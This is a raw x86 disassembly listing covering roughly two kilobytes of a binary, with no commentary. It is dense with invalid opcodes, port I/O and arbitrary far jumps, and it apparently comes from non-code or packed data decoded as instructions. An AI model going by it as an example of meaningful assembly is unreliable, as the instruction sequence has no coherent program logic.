  43796b:	mov    eax,ds:0x6f36287d
  437970:	add    eax,0xd2a118e7
  437975:	fwait
  437976:	pop    eax
  437977:	lods   eax,DWORD PTR ds:[esi]
  437978:	das    
  437979:	xchg   edi,eax
  43797a:	or     al,0x30
  43797c:	cmc    
  43797d:	xor    DWORD PTR [eax],eax
  43797f:	(bad)  
  437980:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  437981:	cmp    al,0x6e
  437983:	scas   eax,DWORD PTR es:[edi]
  437984:	cmp    edx,DWORD PTR [eax+0x7a]
  437987:	push   es
  437988:	addr16 popa 
  43798a:	int3   
  43798b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43798c:	aam    0x16
  43798e:	test   BYTE PTR [eax+0x1e],dh
  437991:	lods   eax,DWORD PTR ds:[esi]
  437992:	pop    ds
  437993:	push   cs
  437994:	mov    dl,0xe5
  437996:	cmp    esp,DWORD PTR [ecx]
  437998:	push   0xc52a891a
  43799d:	js     0x4379c4
  43799f:	lahf   
  4379a0:	and    BYTE PTR [eax-0x60c1db66],dl
  4379a6:	pop    ss
  4379a7:	adc    al,0x64
  4379a9:	and    ch,dh
  4379ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4379ac:	pusha  
  4379ad:	hlt    
  4379ae:	mov    cl,0x81
  4379b0:	jg     0x43796d
  4379b2:	xchg   edi,eax
  4379b3:	mov    ds:0x1ba012fd,al
  4379b8:	ss sub al,0x8c
  4379bb:	add    DWORD PTR [ebx-0x4d],esp
  4379be:	out    dx,al
  4379bf:	call   0x7c05072f
  4379c4:	lahf   
  4379c5:	fucomi st,st(1)
  4379c7:	mov    al,ds:0xcada7bc4
  4379cc:	pop    edi
  4379cd:	adc    esi,DWORD PTR [ebp-0x39cca012]
  4379d3:	test   BYTE PTR [ebp+0x24],bh
  4379d6:	fstp   DWORD PTR [eax]
  4379d8:	mov    ebp,eax
  4379da:	je     0x43797d
  4379dc:	pop    ecx
  4379dd:	push   ds
  4379de:	dec    esp
  4379df:	mov    esi,0x2222c842
  4379e4:	pop    ebp
  4379e5:	mov    esi,0x582daf10
  4379ea:	dec    ecx
  4379eb:	xor    DWORD PTR [esi+0x31a1942b],ebx
  4379f1:	mov    bh,0xcd
  4379f3:	fs sbb al,0x3c
  4379f6:	lods   eax,DWORD PTR ds:[esi]
  4379f7:	jnp    0x437a57
  4379f9:	mov    bh,BYTE PTR [ecx]
  4379fb:	out    dx,eax
  4379fc:	push   0xfffffff3
  4379fe:	jo     0x437a12
  437a00:	ds pop edx
  437a02:	pusha  
  437a03:	shr    DWORD PTR [ecx-0x53],1
  437a06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  437a07:	(bad)  
  437a08:	inc    edi
  437a09:	pusha  
  437a0a:	xchg   ecx,eax
  437a0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  437a0c:	sub    eax,0x11613830
  437a11:	mov    ah,bl
  437a13:	push   ebp
  437a14:	pop    esi
  437a15:	sbb    BYTE PTR [ebx],ah
  437a17:	push   0xa08f005b
  437a1c:	std    
  437a1d:	pusha  
  437a1e:	mov    ebx,0xd50196d8
  437a23:	mov    ds:0x5d501014,eax
  437a28:	pop    ebp
  437a29:	sub    al,BYTE PTR [ebx+0xd399a5c]
  437a2f:	jns    0x437a5f
  437a31:	inc    eax
  437a32:	lds    ebx,FWORD PTR [ebx-0x59f511f6]
  437a38:	ficom  WORD PTR [eax+0x1a97aeb1]
  437a3e:	out    dx,al
  437a3f:	and    eax,0x5086e5c2
  437a44:	outs   dx,BYTE PTR ds:[esi]
  437a45:	sti    
  437a46:	mov    fs,WORD PTR [edx+0x3bf45507]
  437a4c:	jae    0x437a4b
  437a4e:	push   ss
  437a4f:	addr16 jg 0x437a3e
  437a52:	cmp    eax,0xecb4b1ac
  437a57:	repz pop esi
  437a59:	and    eax,0xdb9dcc8
  437a5e:	adc    DWORD PTR [eax-0x5b5b9f56],ebx
  437a64:	mov    esi,esi
  437a66:	xor    edx,ecx
  437a68:	xor    BYTE PTR [ebx+0xad4f8ee],0xa7
  437a6f:	sbb    eax,0x8ecdfe61
  437a74:	jnp    0x437ac3
  437a76:	jg     0x437a99
  437a78:	fisub  WORD PTR [edx+0x78]
  437a7b:	sub    bh,bl
  437a7d:	dec    esi
  437a7e:	pop    esi
  437a7f:	push   ecx
  437a80:	xor    edi,DWORD PTR gs:[edi+eiz*1]
  437a84:	dec    ebp
  437a85:	popa   
  437a86:	aam    0x9a
  437a88:	into   
  437a89:	fwait
  437a8a:	pop    edx
  437a8b:	jae    0x437a58
  437a8d:	pusha  
  437a8e:	in     al,dx
  437a8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  437a90:	or     ch,ah
  437a92:	sbb    ebp,esi
  437a94:	loopne 0x437a90
  437a96:	lock dec ebx
  437a98:	or     eax,0x1bda8073
  437a9d:	fisub  DWORD PTR [esi+0x6b]
  437aa0:	dec    esi
  437aa1:	pop    ecx
  437aa2:	or     DWORD PTR [esi-0x46],esp
  437aa5:	pusha  
  437aa6:	dec    ecx
  437aa7:	retf   
  437aa8:	jne    0x437abc
  437aaa:	jmp    0x85f3:0x24fda2aa
  437ab1:	inc    ebx
  437ab2:	jecxz  0x437a5f
  437ab4:	fiadd  WORD PTR [ebx-0x6c]
  437ab7:	push   cs
  437ab8:	mov    ecx,0x69f2bc46
  437abd:	(bad)  
  437abe:	call   0xc509cc8f
  437ac3:	dec    ebp
  437ac4:	fisub  DWORD PTR [eax-0x2c]
  437ac7:	lods   al,BYTE PTR ds:[esi]
  437ac8:	push   ds
  437ac9:	inc    ebx
  437aca:	cli    
  437acb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  437acc:	pop    esi
  437acd:	call   0x4ebf:0xb21997ac
  437ad4:	inc    esp
  437ad5:	popa   
  437ad6:	loope  0x437a59
  437ad8:	xchg   ebp,eax
  437ada:	outs   dx,BYTE PTR ds:[esi]
  437adb:	lods   al,BYTE PTR ds:[esi]
  437adc:	jne    0x437a8d
  437ade:	jmp    esp
  437ae0:	pop    ds
  437ae1:	adc    DWORD PTR [esi-0x71],ebp
  437ae4:	out    dx,eax
  437ae5:	push   edi
  437ae6:	aam    0xa1
  437ae8:	loope  0x437b4a
  437aea:	test   al,0x37
  437aec:	cdq    
  437aed:	in     al,0x65
  437aef:	das    
  437af0:	popa   
  437af1:	outs   dx,BYTE PTR ds:[esi]
  437af2:	in     eax,dx
  437af3:	xlat   BYTE PTR ds:[ebx]
  437af4:	add    bh,dh
  437af6:	fidivr WORD PTR [ebp+0x3e]
  437af9:	pop    es
  437afa:	sub    dl,BYTE PTR [edx]
  437afc:	fldenv [eax+0x3e]
  437aff:	leave  
  437b00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  437b01:	test   eax,0x830d2d1c
  437b06:	add    ah,ch
  437b08:	mov    ebx,0xe983ab47
  437b0d:	rol    BYTE PTR [esi],0x11
  437b10:	pushf  
  437b11:	jecxz  0x437aab
  437b13:	stos   DWORD PTR es:[edi],eax
  437b14:	out    0x9e,eax
  437b16:	jg     0x437b41
  437b18:	or     ah,cl
  437b1a:	xchg   ebx,eax
  437b1b:	xchg   ebx,eax
  437b1c:	cwde   
  437b1d:	push   eax
  437b1e:	nop
  437b1f:	inc    esp
  437b20:	pop    esi
  437b21:	scas   al,BYTE PTR es:[edi]
  437b22:	popf   
  437b23:	imul   edi,DWORD PTR [esi+0x145cb15b],0xf07ecb61
  437b2d:	test   ah,0x8a
  437b30:	or     BYTE PTR [ebx-0x12],ah
  437b33:	ret    
  437b34:	push   es
  437b35:	add    al,0x8f
  437b37:	push   es
  437b38:	jle    0x437b0d
  437b3a:	stc    
  437b3b:	mov    al,ds:0xf7a7a6cb
  437b40:	pop    es
  437b41:	ins    DWORD PTR es:[edi],dx
  437b42:	xchg   BYTE PTR [edi-0x7f5c50a2],bh
  437b48:	in     al,dx
  437b49:	fs xchg edi,ecx
  437b4c:	jno    0x437bb6
  437b4e:	cmp    BYTE PTR [esi+ebx*8-0x44],al
  437b52:	cdq    
  437b53:	inc    ebx
  437b54:	push   esi
  437b55:	mov    ch,0xe2
  437b57:	dec    edx
  437b58:	pop    esi
  437b59:	mov    esi,0x5f48c9ca
  437b5e:	bound  ebx,QWORD PTR [edi+0x751d614c]
  437b64:	inc    eax
  437b65:	rol    DWORD PTR [esi+0x44],0x50
  437b69:	sbb    ebp,esi
  437b6b:	jmp    0x5f11f36b
  437b70:	adc    eax,0xa5aa829e
  437b75:	shr    BYTE PTR [esi+0x2],cl
  437b78:	sub    dh,ah
  437b7a:	sbb    al,0x14
  437b7c:	mov    esp,0xdea6e719
  437b81:	aad    0xaf
  437b83:	jnp    0x437ba3
  437b85:	inc    edx
  437b86:	les    esi,FWORD PTR [esi+0x7c]
  437b89:	pop    esp
  437b8a:	sbb    eax,0x3f683039
  437b8f:	and    DWORD PTR [ecx+0x28],esi
  437b92:	ja     0x437b62
  437b94:	pop    esi
  437b95:	xchg   esi,eax
  437b96:	push   edi
  437b97:	pop    edi
  437b98:	sub    BYTE PTR [ebx+0x51],al
  437b9b:	cli    
  437b9c:	sbb    ah,BYTE PTR [ebx*4-0x47adb80b]
  437ba3:	xchg   BYTE PTR [ecx],bh
  437ba5:	std    
  437ba6:	loop   0x437c08
  437ba8:	mov    bh,0x8a
  437baa:	or     BYTE PTR [ebx],bh
  437bac:	lods   al,BYTE PTR ds:[esi]
  437bad:	sbb    BYTE PTR [esi*8-0x1ef29ed9],ah
  437bb4:	imul   BYTE PTR [ebp-0x22]
  437bb7:	gs sub eax,0xcaa39f61
  437bbd:	(bad)  [ecx-0x11e5ba70]
  437bc3:	sbb    dh,0x8b
  437bc6:	mov    bh,0x5
  437bc8:	mov    WORD PTR [ebp+0x29c2909e],cs
  437bce:	push   eax
  437bcf:	and    ch,BYTE PTR [ecx+edx*4+0x3c]
  437bd3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  437bd4:	pop    edx
  437bd5:	cdq    
  437bd6:	sub    DWORD PTR [ecx+0x60],edx
  437bd9:	jecxz  0x437bce
  437bdb:	dec    edx
  437bdc:	ret    
  437bdd:	aad    0x41
  437bdf:	and    DWORD PTR [ebp-0x4301d48d],eax
  437be5:	pusha  
  437be6:	loope  0x437c5c
  437be8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  437be9:	dec    esi
  437bea:	xchg   esi,eax
  437beb:	cdq    
  437bec:	mov    dl,0x93
  437bee:	out    0xc1,eax
  437bf0:	mov    fs,WORD PTR [ebp-0xf41ebc3]
  437bf6:	push   esi
  437bf7:	mov    ds:0x3c8e60c2,al
  437bfc:	ss repnz inc edi
  437bff:	jb     0x437bce
  437c01:	add    eax,0x112ed2eb
  437c06:	dec    edi
  437c07:	xchg   ebp,eax
  437c08:	inc    ebp
  437c09:	icebp  
  437c0a:	lods   al,BYTE PTR ds:[esi]
  437c0b:	cmc    
  437c0c:	lock push edx
  437c0e:	vandpd ymm4,ymm0,ymm2
  437c12:	push   cs
  437c13:	push   0x2d995f59
  437c18:	pop    esi
  437c19:	je     0x437bb5
  437c1b:	jg     0x437bb1
  437c1d:	(bad)  
  437c1f:	sbb    ch,bh
  437c21:	mov    ah,0x2b
  437c23:	mov    ds:0x4809fbac,al
  437c28:	mov    cl,0xca
  437c2b:	push   eax
  437c2c:	bnd jge 0x437c1e
  437c2f:	push   edi
  437c30:	pop    edx
  437c31:	int3   
  437c32:	fwait
  437c33:	mov    eax,ds:0x79ba59ca
  437c38:	popa   
  437c39:	popa   
  437c3a:	sub    DWORD PTR [ecx],ecx
  437c3c:	jb     0x437bea
  437c3e:	test   eax,0xeebb8ea5
  437c43:	icebp  
  437c44:	mov    ch,0x33
  437c46:	jg     0x437c52
  437c48:	cmc    
  437c49:	mov    edx,DWORD PTR [eax]
  437c4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  437c4c:	inc    ebp
  437c4d:	push   edi
  437c4e:	clc    
  437c4f:	cmp    edi,eax
  437c51:	loopne 0x437bdc
  437c53:	sbb    bh,BYTE PTR [eax-0x23ef1224]
  437c59:	xchg   ebx,eax
  437c5a:	dec    edi
  437c5b:	xor    bh,bl
  437c5d:	repz into 
  437c5f:	xor    cl,BYTE PTR [ebp+0x5c261a60]
  437c65:	or     cl,BYTE PTR [esi-0x46]
  437c68:	sub    al,0x50
  437c6a:	out    dx,al
  437c6b:	inc    ebx
  437c6c:	in     al,dx
  437c6d:	out    dx,eax
  437c6e:	(bad)  
  437c6f:	mov    edx,0xa14d9921
  437c74:	mov    ds:0x6c48795d,eax
  437c79:	int3   
  437c7a:	inc    edx
  437c7b:	jmp    0x3c8763de
  437c80:	lea    ebp,[edx+0x34]
  437c83:	xchg   esp,eax
  437c84:	sub    DWORD PTR [ecx+0x22],esp
  437c87:	mov    edx,0x3998500d
  437c8c:	jle    0x437d0c
  437c8e:	loop   0x437d0f
  437c90:	pop    esi
  437c91:	xchg   ecx,eax
  437c92:	shl    bl,cl
  437c94:	or     esp,edx
  437c96:	arpl   WORD PTR [esi-0x4a8efeaf],bx
  437c9c:	xchg   ebx,eax
  437c9d:	pusha  
  437c9e:	addr16 inc edx
  437ca0:	inc    ebx
  437ca1:	addr16 mov ebx,0xee35a66a
  437ca7:	mov    bh,0xb0
  437ca9:	call   0x3f5ff04d
  437cae:	mov    dl,0xa0
  437cb0:	(bad)  
  437cb1:	cli    
  437cb2:	mov    bh,al
  437cb4:	lea    esp,[ebp-0x51]
  437cb7:	sti    
  437cb8:	pop    esi
  437cb9:	shl    DWORD PTR [edx],cl
  437cbb:	inc    esp
  437cbc:	(bad)  
  437cbe:	cdq    
  437cbf:	ds addr16 pop edx
  437cc2:	mov    dh,0xb7
  437cc4:	xchg   DWORD PTR [esi-0x6e],esi
  437cc7:	inc    edx
  437cc8:	stos   BYTE PTR es:[edi],al
  437cc9:	fwait
  437cca:	sbb    BYTE PTR [ecx+0x21],ch
  437ccd:	(bad)  
  437cce:	push   DWORD PTR [esp+edi*8+0x73b5aeae]
  437cd5:	mov    edx,0x61411047
  437cda:	cmp    eax,0x893fa591
  437cdf:	pop    eax
  437ce0:	mov    edi,0xa15eee3d
  437ce5:	cmp    BYTE PTR [edx-0x35a3b53e],0xf4
  437cec:	adc    DWORD PTR [ecx+0x7c],esp
  437cef:	push   ds
  437cf0:	xor    BYTE PTR [eax+edx*8-0x75],dl
  437cf4:	lahf   
  437cf5:	je     0x437c9d
  437cf7:	call   0x50bb:0x54af885e
  437cfe:	aad    0x1c
  437d00:	and    al,0xa7
  437d02:	fwait
  437d03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  437d04:	neg    ecx
  437d06:	jle    0x437d33
  437d08:	pop    ebx
  437d09:	rcr    BYTE PTR [esi+0x5e],cl
  437d0c:	in     al,dx
  437d0d:	jne    0x437d20
  437d0f:	cld    
  437d10:	imul   ebp,DWORD PTR [edx+0x606caaa2],0x6c879af8
  437d1a:	ficomp WORD PTR [ebp-0x34119572]
  437d20:	xchg   ebp,eax
  437d21:	inc    eax
  437d22:	mov    ds:0xa13d205d,ax
  437d28:	mov    dh,0xc6
  437d2a:	xchg   esp,eax
  437d2b:	lods   al,BYTE PTR ds:[esi]
  437d2c:	or     DWORD PTR [eax],ebx
  437d2e:	add    BYTE PTR [edi+0x5e],al
  437d31:	dec    esp
  437d32:	cli    
  437d33:	fs je  0x437d64
  437d36:	iret   
  437d37:	shl    BYTE PTR [edi+0x60],1
  437d3a:	je     0x437d0f
  437d3c:	(bad)  
  437d3d:	in     al,dx
  437d3e:	imul   ebp,DWORD PTR ds:0x7eeed782,0xcdb6661b
  437d48:	fsub   st,st(1)
  437d4a:	mov    DWORD PTR [ecx-0x16e6c9dc],esp
  437d50:	icebp  
  437d51:	je     0x437da6
  437d53:	pusha  
  437d54:	pop    esi
  437d55:	dec    eax
  437d56:	aam    0xd2
  437d58:	sub    dl,bl
  437d5a:	test   BYTE PTR [edx],0xae
  437d5d:	pop    ebp
  437d5e:	out    dx,eax
  437d5f:	sbb    al,0x6c
  437d61:	cmp    DWORD PTR [edi-0x124329c3],ebp
  437d67:	nop
  437d68:	adc    BYTE PTR [eax+edi*8],0x82
  437d6c:	mov    ds:0x314bedd6,al
  437d71:	pop    ebx
  437d72:	cmp    al,0x14
  437d74:	push   0x7b
  437d76:	push   esi
  437d77:	sub    DWORD PTR [esi],0xee8f42c9
  437d7d:	fcmovnbe st,st(6)
  437d7f:	pusha  
  437d80:	and    DWORD PTR es:[esi+0x55],esp
  437d84:	inc    edx
  437d85:	cwde   
  437d86:	out    0x51,eax
  437d88:	sub    ebp,esp
  437d8a:	inc    esp
  437d8b:	add    cl,BYTE PTR [esi-0x5d983324]
  437d91:	pop    edi
  437d92:	mov    bl,0x1b
  437d94:	xlat   BYTE PTR ds:[ebx]
  437d95:	sar    BYTE PTR [esi-0x785ee951],1
  437d9b:	mov    bh,0x5e
  437d9d:	add    ecx,edx
  437d9f:	mov    ebx,0xcf1bc54d
  437da4:	aad    0x60
  437da6:	jmp    0xbd05:0xbc227a31
  437dad:	add    eax,0xc1c48eee
  437db2:	int3   
  437db3:	push   ecx
  437db4:	mov    bh,0x5f
  437db6:	xchg   ebp,eax
  437db7:	mov    al,0x75
  437db9:	or     ch,BYTE PTR [esi+0x38]
  437dbc:	jecxz  0x437d91
  437dbe:	aaa    
  437dbf:	mov    esi,0x78ee4d2d
  437dc4:	mov    WORD PTR [ebp+0x29],ss
  437dc7:	pop    ebp
  437dc8:	fild   WORD PTR [esi+0x28]
  437dcb:	mov    eax,ds:0x77ed4a2c
  437dd0:	cmc    
  437dd1:	lock xlat BYTE PTR ds:[ebx]
  437dd3:	div    BYTE PTR [ebx]
  437dd5:	xchg   edi,eax
  437dd6:	loopne 0x437d78
  437dd8:	dec    edx
  437dd9:	adc    BYTE PTR [edx+ebp*1],bl
  437ddc:	jo     0x437dbe
  437dde:	or     DWORD PTR [ecx+0x52f1d32d],esp
  437de4:	and    eax,DWORD PTR [ebx-0x779ce177]
  437dea:	(bad)  
  437deb:	test   BYTE PTR [ebx],cl
  437ded:	shl    DWORD PTR [ebx],0x3d
  437df0:	arpl   WORD PTR [edi+0x611886bf],di
  437df6:	jl     0x437d9a
  437df8:	xor    ebp,DWORD PTR [ecx-0x48]
  437dfb:	lock jno 0x437dc4
  437dfe:	xchg   BYTE PTR [eax+edi*2-0x53],al
  437e02:	jmp    0x437e1c
  437e04:	mov    esi,0x43db25ac
  437e09:	mov    cl,0xd3
  437e0b:	stos   BYTE PTR es:[edi],al
  437e0c:	aas    
  437e0d:	popa   
  437e0e:	mov    al,0x81
  437e10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  437e11:	push   edx
  437e12:	mov    dl,0xcf
  437e14:	push   ebx
  437e15:	jno    0x437e05
  437e17:	sbb    BYTE PTR [ebx+0x1c641c2],ah
  437e1d:	push   es
  437e1e:	mov    ah,BYTE PTR [ecx-0x2c3bf447]
  437e24:	add    cl,bl
  437e26:	lock mov cl,0x5f
  437e29:	push   edi
  437e2a:	sub    eax,0x88134256
  437e2f:	pop    ecx
  437e30:	out    dx,al
  437e31:	pop    esi
  437e32:	sub    DWORD PTR [edx-0x799ffdfd],ebx
  437e38:	fisubr WORD PTR [ebp+0xa]
  437e3b:	cmc    
  437e3c:	mov    BYTE PTR [edi+0x5243f3ee],bl
  437e42:	mov    ecx,0x3ef3a08d
  437e47:	mov    ds:0x4470ebf2,al
  437e4c:	ins    BYTE PTR es:[edi],dx
  437e4d:	pop    ecx
  437e4e:	mov    ds:0xee4e0d5d,al
  437e53:	mov    cl,0xa3
  437e55:	test   DWORD PTR [ebx+ecx*2-0x5ee59417],esp
  437e5c:	add    DWORD PTR [esi],edx
  437e5e:	clc    
  437e5f:	ret    
  437e60:	mov    esi,0x5ed69334
  437e65:	ret    0x6b0
  437e68:	ja     0x437e61
  437e6a:	sub    BYTE PTR [edx+0x1e],0x61
  437e6e:	push   0xe44893c9
  437e73:	dec    eax
  437e74:	or     DWORD PTR [edx],0x8e44b2ee
  437e7a:	fcom   QWORD PTR [edx]
  437e7c:	ds stc 
  437e7e:	mov    eax,fs:0x8be50e34
  437e84:	jg     0x437e40
  437e86:	jno    0x437eca
  437e88:	pop    ebp
  437e89:	xor    al,0xbe
  437e8b:	pusha  
  437e8c:	cld    
  437e8d:	mov    esi,0xb6c18a18
  437e93:	mov    al,ds:0xb4533da8
  437e98:	inc    ch
  437e9a:	das    
  437e9b:	js     0x437efb
  437e9d:	xchg   ebp,eax
  437e9e:	(bad)  
  437e9f:	fwait
  437ea0:	push   esi
  437ea1:	mov    edx,ss
  437ea3:	outs   dx,BYTE PTR ds:[esi]
  437ea4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  437ea5:	pusha  
  437ea6:	xlat   BYTE PTR ds:[ebx]
  437ea7:	arpl   WORD PTR [esi+0x58],di
  437eaa:	inc    ecx
  437eab:	ror    DWORD PTR [ecx],cl
  437ead:	fsubr  st,st(6)
  437eaf:	stc    
  437eb0:	adc    ebx,ebx
  437eb2:	lods   eax,DWORD PTR ds:[esi]
  437eb3:	push   es
  437eb4:	out    0x1b,al
  437eb6:	mov    eax,ds:0x33c53194
  437ebc:	fucom  st(2)
  437ebe:	gs push eax
  437ec0:	pop    esi
  437ec1:	ret    0x4d56
  437ec4:	test   al,ah
  437ec6:	(bad)  
  437ec7:	popa   
  437ec8:	repnz pop cx
  437ecb:	imul   ebx,DWORD PTR [esi+0x3c],0xb
  437ecf:	es sub al,0xf3
  437ed2:	pop    esi
  437ed3:	call   0x7e9ba036
  437ed8:	cli    
  437ed9:	imul   DWORD PTR [ebx+0x76]
  437edc:	je     0x437f3e
  437ede:	into   
  437edf:	ret    0xa7dd
  437ee2:	or     eax,0xeeb76411
  437ee7:	mov    edi,0x19ab5d5d
  437eec:	ror    DWORD PTR [edx-0x6d595f59],0x16
  437ef3:	bound  ebx,QWORD PTR ds:0x5ebc8afa
  437ef9:	dec    edi
  437efa:	jno    0x437f19
  437efc:	add    eax,0x6ea33bb3
  437f01:	pusha  
  437f02:	stos   BYTE PTR es:[edi],al
  437f03:	std    
  437f04:	mov    bl,bh
  437f06:	sub    BYTE PTR [ebx],0x14
  437f09:	retf   
  437f0a:	out    0x43,eax
  437f0c:	inc    ecx
  437f0d:	pop    ebx
  437f0e:	mov    edi,0x3af7d10
  437f13:	enter  0xac6a,0x3e
  437f17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  437f18:	xlat   BYTE PTR ds:[ebx]
  437f19:	fs dec edx
  437f1b:	xchg   ebp,eax
  437f1c:	inc    edi
  437f1d:	push   ebp
  437f1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  437f1f:	add    ecx,DWORD PTR [esi]
  437f21:	cmp    esi,ebp
  437f23:	arpl   bx,di
  437f25:	pushf  
  437f26:	(bad)  [edi-0x5f401e24]
  437f2c:	cdq    
  437f2d:	pop    ecx
  437f2e:	pop    ds
  437f2f:	imul   esi,DWORD PTR [ebp+0x4b],0xffffffb2
  437f33:	and    al,0xf7
  437f35:	push   WORD PTR [ebx+0x4eaecc2c]
  437f3c:	add    DWORD PTR [edx+0x42d7bb96],edi
  437f42:	(bad)  
  437f43:	addr16 push esi
  437f45:	loopne 0x437f2a
  437f47:	aas    
  437f48:	mov    edi,0xf7616d5f
  437f4e:	(bad)  [esi+ebx*2]
  437f51:	out    dx,eax
  437f52:	mov    dl,bl
  437f54:	ror    BYTE PTR [ebx],0xe7
  437f57:	mov    ds:0x88b608be,eax
  437f5c:	pop    ebp
  437f5d:	adc    cl,al
  437f5f:	ss xor eax,0xcc65429c
  437f65:	xchg   DWORD PTR [esi],ebp
  437f67:	inc    ebp
  437f68:	mov    BYTE PTR [edi+0x606b3a07],ah
  437f6e:	(bad)  [ebp+0x31]
  437f71:	sub    eax,0xba708380
  437f76:	out    dx,al
  437f77:	push   edi
  437f78:	pop    ds
  437f79:	jmp    0x437f63
  437f7b:	in     al,dx
  437f7c:	xchg   esi,eax
  437f7d:	ja     0x437f05
  437f7f:	mov    eax,ds:0x8eb3e5bb
  437f84:	mov    al,0x4e
  437f86:	mov    ebp,ebx
  437f88:	(bad)  
  437f89:	cs out dx,al
  437f8b:	cmp    bh,dh
  437f8d:	lods   al,BYTE PTR ds:[esi]
  437f8e:	inc    ebx
  437f8f:	(bad)  
  437f90:	adc    al,0x61
  437f92:	mov    bh,0x9e
  437f94:	aad    0xd3
  437f96:	cmp    BYTE PTR [edi-0x6910ffc5],al
  437f9c:	rcl    BYTE PTR [ecx-0x42],0x3b
  437fa0:	lahf   
  437fa1:	push   ss
  437fa2:	mov    DWORD PTR [ecx-0x37cc66d],esp
  437fa8:	jno    0x437fd0
  437faa:	aam    0x9d
  437fac:	pop    edx
  437fad:	xchg   edx,eax
  437fae:	mov    ds:0x6b5b4451,al
  437fb3:	lds    edx,FWORD PTR [eax]
  437fb5:	fidivr DWORD PTR [esi-0x43]
  437fb8:	xchg   edx,eax
  437fb9:	js     0x437f91
  437fbb:	push   0x39
  437fbd:	popa   
  437fbe:	and    eax,0x2be0c970
  437fc3:	iret   
  437fc4:	pop    edx
  437fc5:	dec    ecx
  437fc6:	and    ebx,ecx
  437fc8:	aad    0xe0
  437fca:	mov    ah,BYTE PTR [edi]
  437fcc:	mov    dh,0x12
  437fce:	(bad)  
  437fcf:	outs   dx,DWORD PTR ds:[esi]
  437fd0:	inc    ebx
  437fd1:	pop    edx
  437fd2:	loopne 0x437fa3
  437fd4:	scas   al,BYTE PTR es:[edi]
  437fd5:	jo     0x437fde
  437fd7:	xchg   ecx,eax
  437fd8:	xchg   edx,eax
  437fd9:	fs in  al,dx
  437fdb:	xchg   DWORD PTR [esi+0x36],ebx
  437fde:	cmp    eax,0xfc499124
  437fe3:	jmp    FWORD PTR [ecx+eiz*2]
  437fe6:	jecxz  0x438045
  437fe8:	push   edx
  437fe9:	in     al,dx
  437fea:	push   ebx
  437feb:	and    ebp,esi
  437fed:	mov    ebp,ebp
  437fef:	sahf   
  437ff0:	pop    ebx
  437ff1:	(bad)  
  437ff2:	sahf   
  437ff3:	pop    ecx
  437ff4:	xchg   esp,eax
  437ff5:	push   cs
  437ff6:	or     BYTE PTR ss:[edi],dh
  437ff9:	push   0x8b0ebb3a
  437ffe:	dec    ebx
  437fff:	bound  esp,QWORD PTR [ebx+ebp*8-0x4f651848]
  438006:	popf   
  438007:	dec    eax
  438008:	fs push esi
  43800a:	push   esi
  43800b:	sub    al,BYTE PTR [ebx+0x1ff6aec3]
  438011:	inc    esi
  438013:	adc    eax,0x2c7d6125
  438018:	xor    DWORD PTR ds:0xc1ff6b0d,eax
  43801e:	out    dx,al
  43801f:	stos   DWORD PTR es:[edi],eax
  438020:	inc    ebp
  438021:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  438022:	xchg   esp,eax
  438023:	cdq    
  438024:	lods   eax,DWORD PTR ds:[esi]
  438025:	dec    ebp
  438026:	mov    eax,ss:0x8d75f3e6
  43802c:	adc    eax,0xb6a9a527
  438031:	dec    eax
  438032:	jmp    0x437fe1
  438034:	arpl   WORD PTR [ebx-0x26c5f006],di
  43803a:	je     0x437fd5
  43803c:	dec    ecx
  43803d:	popa   
  43803e:	loop   0x43805e
  438040:	lock es jl 0x438071
  438044:	das    
  438045:	loope  0x438059
  438047:	ss and ah,cl
  43804a:	cmc    
  43804b:	clc    
  43804c:	ins    DWORD PTR es:[edi],dx
  43804d:	loopne 0x4380be
  43804f:	retf   
  438050:	fstp   st(5)
  438052:	cld    
  438053:	mov    al,ds:0x8850761e
  438058:	je     0x438068
  43805a:	test   BYTE PTR [edx+0x5e],0x64
  43805e:	sahf   
  43805f:	out    dx,eax
  438060:	mov    al,0x9f
  438062:	es inc ecx
  438064:	inc    ebx
  438065:	popa   
  438066:	add    DWORD PTR [ecx-0x7a],esi
  438069:	int3   
  43806a:	mov    dh,0x69
  43806c:	pop    ecx
  43806d:	pushf  
  43806e:	adc    BYTE PTR [ecx],bh
  438070:	mov    edi,0x79aaecc3
  438075:	push   es
  438076:	dec    edi
  438077:	popa   
  438078:	mov    WORD PTR [ecx-0x62],es
  43807b:	mov    eax,ds:0xadc7807e
  438080:	mov    ds:0x823b3a08,al
  438085:	pop    es
  438086:	ret    0x9cc2
  438089:	pusha  
  43808a:	push   ecx
  43808b:	imul   ecx,DWORD PTR [ecx+0x7872e4b8],0xaa1072d
  438095:	pusha  
  438096:	(bad)  
  438097:	sti    
  438098:	(bad)  
  438099:	hlt    
  43809a:	mov    ebx,DWORD PTR [ebx+0x5e]
  43809d:	adc    eax,0x7b6429ab
  4380a2:	pusha  
  4380a3:	aaa    
  4380a4:	or     eax,0xf24e160
  4380a9:	imul   edi,DWORD PTR [edx-0x2f],0x71c78459
  4380b0:	les    ebx,FWORD PTR [edi+0x7a7d7135]
  4380b6:	in     eax,dx
  4380b7:	leave  
  4380b8:	fs mov ecx,0x82b37a96
  4380be:	dec    edx
  4380bf:	idiv   edx
  4380c1:	pusha  
  4380c2:	jae    0x438123
  4380c4:	push   esi
  4380c5:	mov    DWORD PTR [ebp-0x52],0xb2ee5c32
  4380cc:	or     DWORD PTR [ecx-0x46bae069],edx
  4380d2:	rcr    DWORD PTR [esi-0x4b517ce0],0xde
  4380d9:	cdq    
  4380da:	stos   BYTE PTR es:[edi],al
  4380db:	clc    
  4380dc:	(bad)  
  4380dd:	fdivp  st(2),st
  4380df:	(bad)
  4380e2:	inc    esp
  4380e3:	mov    ds:0x41449580,al
  4380e8:	clc    
  4380e9:	daa    
